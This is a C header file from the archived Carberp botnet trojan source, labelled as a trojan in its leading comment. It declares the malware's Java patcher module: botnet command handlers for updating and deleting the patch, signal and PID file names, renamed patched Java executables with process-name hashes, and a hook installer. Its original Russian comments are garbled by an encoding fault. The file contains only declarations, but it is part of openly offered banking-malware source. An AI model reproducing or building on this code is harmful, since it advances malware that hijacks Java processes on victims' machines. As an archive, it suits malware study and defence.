/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef		JAVS_PATCHERH
#define		JAVS_PATCHERH

#include "windows.h"

#include "Javaclient2015Saver.h"

const char* GetJREPath();
const char UpdatePath[] = "UpdatePatch\0";
const char DeletePath[] = "deletepatch\0";

// ��� ����������� �����. ���� ������ ���������� � ����������
// ���������� ���� ������������� (WIN 7 -  c:\Users\All Users\
// ��� ������ � ������ ����� ������� ���� � ������ ������ ����������
// ������ �����
const char JavaPatcherSignalFile[] = "Pat.txt";


// ��� ����� ���� ������������ ���� ��������� ��� �������
// ���������� ��������� ����
const char JavaPatcherPidsFile[] = "wj.dat";


// ����� ������������ ���
const char Patched_Jawa_Name[]  = "javao.exe";
const char Patched_Jawaw_Name[] = "javawo.exe";

#define PROCESS_HASH_PATCHED_JAVA  0x9F1AA76B /* javao.exe */
#define PROCESS_HASH_PATCHED_JAVAW 0x9434FBEE /* javawo.exe */


bool ExecuteUpdatePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);

bool WINAPI ClearAndDel( LPVOID lpData );

DWORD WINAPI Run_Path(LPVOID lpData);
bool JavaPatchInstalled();


//-------------------------------------------------------------
// JavaPatcherSignal - ������� ������������� � �������������
//                     ������� ������
//-------------------------------------------------------------
DWORD WINAPI JavaPatcherSignal(LPVOID lpData);
//������������ ���� ��� ��� �������, ������ � ������ ���� �������� �������� �� ��������
bool SetJavaPatcherHook();
//���������� ������� ����� ��� �������, path ������ ����� ����������� ��������� ������, ���� ������ fileName, �� ���
//����� ����� ����������� � ������� �����
char* GetJavaPatchWorkFolder( char* path, const char* fileName = 0 );

#endif		//java_patcher
